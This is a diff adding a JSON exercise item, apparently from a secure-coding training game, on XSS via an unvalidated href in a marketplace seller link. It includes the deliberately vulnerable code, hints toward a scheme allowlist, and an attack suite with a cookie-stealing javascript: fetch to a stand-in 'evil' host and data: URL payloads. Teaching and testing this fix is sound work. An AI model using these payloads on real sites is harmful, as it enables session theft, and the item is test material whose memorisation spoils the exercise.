@@ -1,0 +1,59 @@
+{
+  "id": "sec-205",
+  "title": "A seller's website link runs code when clicked",
+  "skill": "xss",
+  "subSkill": "xss.sanitisation",
+  "tier": "advanced",
+  "format": "patch",
+  "validator": "ast-diff",
+  "repo": "aurora-store",
+  "file": "public/seller.js",
+  "reportedBy": "Priya (Support)",
+  "masteryRequired": 0.6,
+  "isDrill": false,
+  "isBoss": false,
+  "requires": "harden-201",
+  "brief": "This code already uses textContent, so it looks like it has learned its lesson. A marketplace seller set their website to something that is not a website, and customers who click it lose their session. Text is not the only way into a page.",
+  "vulnerable": "function renderSeller(seller) {\n  const link = document.createElement('a');\n  link.textContent = seller.name;\n  link.href = seller.website;\n  document.querySelector('#seller').append(link);\n}",
+  "meta": {
+    "inputNames": [
+      "website",
+      "seller"
+    ]
+  },
+  "rules": [
+    "xss.url-scheme-allowlisted",
+    "output.link-still-works",
+    "output.reaches-the-page"
+  ],
+  "attackSuite": [
+    {
+      "payload": "javascript:fetch('//evil/'+document.cookie)",
+      "label": "A javascript: URL"
+    },
+    {
+      "payload": "JaVaScRiPt:alert(1)",
+      "label": "Mixed case"
+    },
+    {
+      "payload": "data:text/html,<script>alert(1)</script>",
+      "label": "A data: URL"
+    }
+  ],
+  "functionalSuite": [
+    {
+      "value": "https://kettles-and-co.example",
+      "label": "A real shop's website"
+    }
+  ],
+  "hints": [
+    "textContent protected the name. The href is a different kind of sink: the browser does not render it, it navigates to it.",
+    "Blocking 'javascript:' means guessing every spelling an attacker might use. Which schemes does a seller's website actually need?",
+    "Parse it with new URL() and only set href when the protocol is 'https:' or 'http:'."
+  ],
+  "xp": {
+    "firstAttempt": 160,
+    "withHints": 80,
+    "retry": 50
+  }
+}
